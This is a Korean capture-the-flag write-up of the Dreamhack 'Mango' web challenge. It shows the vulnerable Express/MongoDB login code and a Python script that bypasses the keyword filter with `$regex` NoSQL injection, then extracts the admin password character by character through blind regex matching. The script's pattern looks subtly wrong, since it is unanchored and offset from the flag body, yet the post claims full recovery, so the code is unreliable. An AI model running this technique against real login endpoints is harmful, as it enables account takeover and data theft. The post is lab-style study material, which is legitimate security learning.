---
title: "[CTF] 드림핵 Mango"
date: 2025-09-18 18:50:00 +0900
categories: [CTF, Web]
tags: [CTF, MongoDB, NoSQLi]
description: "드림핵 Mango 문제 풀이"
author: "송지민"
toc: true
---

## 문제 개요
간단한 Express + MongoDB 앱이다. 로그인 엔드포인트에서 특정 단어를 포함하면 필터링을 하고, 필터를 통과하면 MongoDB에서 `uid`와 `upw`를 직접 조회한다. 플래그는 DB에 `{'uid':'admin','upw':'DH{32alphanumeric}'}` 형태로 들어있다.

문제 코드(원본 전체):

```js
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');
```

## 핵심 취약점
- `filter`는 요청 파라미터 전체를 JSON 문자열로 만들고 금지어(`admin`, `dh`, `admi`)를 포함하면 차단한다.
- 금지어 필터를 우회할 수 있다. MongoDB 질의로 `$regex`를 사용하면 쿼리가 객체 형태로 전달되어 `dump`에서 점(`.`) 같은 문자가 들어가도 금지어 문자열이 연속으로 포함되지 않을 수 있다.
- MongoDB의 정규식 기반 매칭을 이용해 플래그를 하나씩 추출할 수 있다.

## 풀이 아이디어
1. `uid`에 `admin`을 그대로 쓰면 필터에 걸리므로 우회가 필요하다. `uid[$regex]=ad.in`처럼 `.`을 끼워 넣으면 JSON 문자열에는 `ad.in` 형태로 찍혀 `admin`과 연속되지 않아 필터를 통과한다.
2. `upw`는 32자의 영숫자 조합이다. 한 글자씩 추측하면서 정규식으로 검사한다. 예를 들어 지금까지 알아낸 문자열이 `ABC`이고 다음 문자가 `x`인지 확인하려면 `upw[$regex]=D.{3}x` 와 같은 패턴(정확한 패턴은 문제 DB 형식에 맞춰 조정)을 사용해 조건에 맞는 계정을 찾는다.
3. 서버가 `result`를 반환하면 `result['uid'] === 'admin'` 이므로 응답이 `admin`이면 성공 신호로 간주하고 다음 문자로 넘어간다.

## 내가 쓴 자동화 스크립트 (Python)
아래는 사용한 PoC 스크립트(사용자 환경에 맞게 HOST를 수정해서 실행).

```python
import requests, string

HOST = 'http://TARGET:8000'
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''

for i in range(32):
    for ch in ALPHANUMERIC:
        # uid는 regex로 admin 우회, upw는 위치 기반으로 매칭
        payload = {
            'uid[$regex]': 'ad.in',           # admin 우회
            # upw 정규식 예시: ^D{N}ch  또는 문제에 맞춰 조정
            'upw[$regex]': f'D.{{{i}}}{ch}'
        }
        r = requests.get(HOST + '/login', params=payload, timeout=5)
        if r.text.strip() == SUCCESS:
            flag += ch
            print(f'Found {len(flag)}: {flag}')
            break

print(f'FLAG: DH{{{flag}}}')
```

이 스크립트는 알파벳+숫자 조합을 순회하며 `/login`을 호출하고, 응답이 `admin`이면 해당 문자를 플래그의 다음 문자로 기록한다.

## 결과
자동화로 32자를 모두 찾아 `DH{...}` 형태의 플래그를 복원했다. 필터가 문자열 단위로만 검사한다는 점을 이용해 `$regex`를 통해 쿼리를 객체로 전달하면 금지어를 우회할 수 있다.

## 마무리
Mango 문제는 단순해 보이지만 필터 로직의 한계를 이용해 NoSQL 주입/정규식 매칭으로 플래그를 추출하는 전형적인 문제였다. 소스코드와 PoC를 포함해 정리해뒀다.
